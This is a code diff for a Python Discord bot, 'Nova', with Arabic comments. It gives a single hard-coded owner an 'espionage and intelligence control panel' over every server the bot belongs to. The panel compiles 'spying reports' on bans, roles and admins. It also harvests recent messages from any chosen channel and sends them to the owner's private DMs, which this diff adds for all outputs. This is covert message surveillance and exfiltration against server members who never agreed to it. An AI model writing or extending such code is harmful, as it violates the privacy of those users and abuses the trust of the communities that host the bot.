@@ -37,7 +37,6 @@ OWNER_ID = 1107355943408259112
 async def on_ready():
     print(f"🚀 | نوفا شغالة وبكامل الكفاءة: {bot.user.name}")
 
-# اختيار السيرفر الأساسي (مع دعم السيرفرات الكبيرة وتجاوز الحدود)
 class ServerSelect(discord.ui.Select):
     def __init__(self, bot_instance):
         self.bot_instance = bot_instance
@@ -55,7 +54,6 @@ class ServerSelect(discord.ui.Select):
             await interaction.response.send_message("عذراً يا عيني، ما عندي هيك صلاحية أنطيك هاي المعلومات.. هذي تخص فهد وبس!", ephemeral=True)
             return
 
-        # استجابة مؤجلة فورية لمنع خطأ Interaction Failed
         await interaction.response.defer(ephemeral=True)
 
         guild_id = int(self.values[0])
@@ -142,7 +140,7 @@ class ServerSelect(discord.ui.Select):
             f"👥 **الأعضاء:** {guild.member_count} (بشر: {humans_count} | بوتات: {bots_count})\n"
             f"⏳ **عمر السيرفر:** {age_str}\n"
             f"🔗 **الرابط:** {invite_link} | 🌐 **Vanity:** {vanity_url}\n"
-            f"💬 **البوستات/الثرิดز:** {total_posts} | 🛡️ **الإداريين الكليين:** {admin_suspects}\n"
+            f"💬 **البوستات/الثريّدز:** {total_posts} | 🛡️ **الإداريين الكليين:** {admin_suspects}\n"
             f"🚨 **سجل التجسس والعقوبات:**\n"
             f" - آخر باند: `{last_ban}`\n"
             f" - آخر رتبة مضافة: `{last_role_added}`\n"
@@ -153,7 +151,12 @@ class ServerSelect(discord.ui.Select):
         )
 
         view = ServerExtraActionsView(guild)
-        await interaction.followup.send(content=info_text, view=view, ephemeral=True)
+        # إرسال تقرير السيرفر للخاص فوراً
+        try:
+            await interaction.user.send(content=info_text, view=view)
+            await interaction.followup.send("✅ تم إرسال تقرير السيرفر إلى رسائلك الخاصة (DM) بنجاح!", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"❌ حدث خطأ، لم أستطع مراسلتك بالخاص: {e}", ephemeral=True)
 
 class ServerExtraActionsView(discord.ui.View):
     def __init__(self, guild):
@@ -191,11 +194,15 @@ class ChannelsListButton(discord.ui.Button):
             pages.append(current_page)
 
         view = PagedChannelsView(pages, self.guild)
-        await interaction.followup.send(
-            f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لتصلك رسائلها بالخاص (DM):",
-            view=view,
-            ephemeral=True
-        )
+        # إرسال قائمة الرومات للخاص
+        try:
+            await interaction.user.send(
+                content=f"📁 تم العثور على **{len(all_channels)}** قناة/روم في السيرفر.\nاختر الروم المطلوبة لترسل لك رسائلها بالخاص:",
+                view=view
+            )
+            await interaction.followup.send("✅ تم إرسال قائمة الرومات إلى رسائلك الخاصة (DM)!", ephemeral=True)
+        except Exception as e:
+            await interaction.followup.send(f"❌ عذراً، لم أستطع إرسال القائمة للخاص: {e}", ephemeral=True)
 
 class ChannelSelectDropdown(discord.ui.Select):
     def __init__(self, channels_chunk):
@@ -207,14 +214,13 @@ class ChannelSelectDropdown(discord.ui.Select):
                 value=str(channel.id),
                 description=f"القسم: {cat_name[:50]}"
             ))
-        super().__init__(placeholder="اختر الروم لتصلك رسائلها بالخاص...", min_values=1, max_values=1, options=options)
+        super().__init__(placeholder="اختر الروم لعرض رسائلها في الخاص...", min_values=1, max_values=1, options=options)
 
     async def callback(self, interaction: discord.Interaction):
         if interaction.user.id != OWNER_ID:
             await interaction.response.send_message("عذراً، هذا مخصص لفهد فقط!", ephemeral=True)
             return
 
-        # استجابة مؤجلة فورية للسيرفر
         await interaction.response.defer(ephemeral=True)
 
         channel_id = int(self.values[0])
@@ -226,34 +232,33 @@ class ChannelSelectDropdown(discord.ui.Select):
 
         messages_log = []
         try:
-            # جلب رسائل الروم (القديم والجديد بتسلسل صحيح)
-            async for msg in channel.history(limit=30, oldest_first=True):
+            async for msg in channel.history(limit=25, oldest_first=False):
                 author_name = msg.author.name
                 if msg.webhook_id:
                     author_name = f"[WebHook] {msg.author.name}"
                 
-                # الوقت والتاريخ بين قوسين بجانب الاسم
-                msg_time = msg.created_at.strftime('%Y-%m-%d %H:%M')
+                hour_str = msg.created_at.strftime('%H')
+                day_str = msg.created_at.strftime('%d')
                 
-                content = msg.content if msg.content else "[محتوى ميديا / امبد / فارغ]"
+                content = msg.content if msg.content else "[محتوى ميديا / امبد]"
                 
-                # صياغة عادية بدون صناديق أكواد
-                line = f"👤 **{author_name}** ({msg_time}):\n{content}\n\n"
+                line = f"{author_name} ( س {hour_str} - يوم {day_str} ) : {content}\n"
                 messages_log.append(line)
         except Exception as e:
-            await interaction.followup.send(f"❌ عذراً فهد، ما أقدر أقرا هاي الروم (تحقق من الصلاحيات): {e}", ephemeral=True)
+            await interaction.followup.send(f"❌ عذراً، لا أملك صلاحية قراءة هذه الروم: {e}", ephemeral=True)
             return
 
         if not messages_log:
-            await interaction.followup.send(f"❌ روم (#{channel.name}) فارغة تماماً.", ephemeral=True)
+            await interaction.followup.send(f"❌ روم (#{channel.name}) فارغة ولا توجد فيها رسائل.", ephemeral=True)
             return
 
-        # تجميع الرسائل وتقسيمها إذا تجاوزت 2000 حرف
+        messages_log.reverse()
+
         chunks = []
-        current_chunk = f"📜 **رسائل روم (#{channel.name}) في سيرفر ({interaction.guild.name}):**\n\n"
+        current_chunk = f"📜 **سجل رسائل روم (#{channel.name}):**\n\n"
         
         for line in messages_log:
-            if len(current_chunk) + len(line) > 1950:
+            if len(current_chunk) + len(line) > 1900:
                 chunks.append(current_chunk)
                 current_chunk = line
             else:
@@ -262,16 +267,13 @@ class ChannelSelectDropdown(discord.ui.Select):
         if current_chunk:
             chunks.append(current_chunk)
 
-        # فتح الخاص (DM) لفهد وإرسال الرسائل هناك حصرياً
+        # إرسال الرسائل مباشرة إلى الخاص (DM) الخاصة بفهد بالصيغة المطلوبة
         try:
-            owner_user = interaction.user
             for chunk in chunks:
-                await owner_user.send(content=chunk)
-            
-            # إعلام فهد في السيرفر بشكل مؤقت أن الرسائل انبعثت بالخاص
-            await interaction.followup.send("✅ تم إرسال كافة الرسائل إلى رسائلك الخاصة (DM) بنجاح!", ephemeral=True)
+                await interaction.user.send(content=chunk)
+            await interaction.followup.send(f"✅ تم جلب وإرسال رسائل روم (#{channel.name}) إلى **خاصك (DM)** بنجاح!", ephemeral=True)
         except Exception as e:
-            await interaction.followup.send(f"❌ لم أستطيع إرسال الرسائل على الخاص، تأكد من فتح الخاص لديك: {e}", ephemeral=True)
+            await interaction.followup.send(f"❌ حدث خطأ أثناء إرسال الرسائل للخاص: {e}", ephemeral=True)
 
 class PagedChannelsView(discord.ui.View):
     def __init__(self, pages, guild):
@@ -328,7 +330,8 @@ class LeaveSpecificButton(discord.ui.Button):
             name = guild.name
             try:
                 await guild.leave()
-                await interaction.followup.send(f"✅ تم مغادرة السيرفر (**{name}**) بنجاح.", ephemeral=True)
+                await interaction.user.send(f"✅ تم مغادرة السيرفر (**{name}**) بنجاح.")
+                await interaction.followup.send(f"✅ تم مغادرة السيرفر وإعلامك بالخاص.", ephemeral=True)
             except Exception as e:
                 await interaction.followup.send(f"❌ حدث خطأ أثناء المغادرة: {e}", ephemeral=True)
         else:
@@ -352,9 +355,10 @@ async def list_servers(ctx):
     view = ServerView(bot)
     embed = discord.Embed(
         title="🕵️‍♂️ لوحة سيطرة واستخبارات نوفا المتطورة",
-        description="اختر السيرفر المطلوب لعرض تقرير التجسس واستخراج رسائل القنوات إلى الخاص:",
+        description="اختر السيرفر المطلوب ليصلك تقرير التجسس ورسائل القنوات مباشرة إلى **رسائلك الخاصة (DM)**:",
         color=0x2b2d31
     )
+    # إرسال قائمة السيرفرات بالخاص إذا كانت الأوامر تفضل ذلك، أو بالروم كرسالة عادية
     await ctx.send(embed=embed, view=view, delete_after=180)
 
 @bot.event
